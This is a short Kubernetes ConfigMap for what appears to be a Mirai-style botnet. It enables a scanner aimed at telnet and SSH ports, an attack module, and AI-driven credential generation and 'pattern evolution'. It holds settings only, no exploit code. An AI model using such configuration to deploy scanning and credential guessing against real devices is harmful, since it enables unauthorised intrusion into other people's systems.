apiVersion: v1
kind: ConfigMap
metadata:
  name: mirai-config
  namespace: mirai-2026
data:
  LOG_LEVEL: "INFO"
  SCANNER_MAX_CONNECTIONS: "256"
  SCANNER_SCAN_RATE: "1000"
  AI_API_ENDPOINT: "http://ai-service:5000"
  
  bot.json: |
    {
      "version": "2.0.0",
      "scanner": {
        "enabled": true,
        "max_connections": 256,
        "scan_rate_pps": 1000,
        "target_ports": [23, 2323, 22]
      },
      "attack": {
        "enabled": true,
        "max_concurrent": 8
      },
      "ai": {
        "enabled": true,
        "credential_generation": true,
        "pattern_evolution": true
      },
      "logging": {
        "level": "info",
        "destination": "stdout"
      }
    }
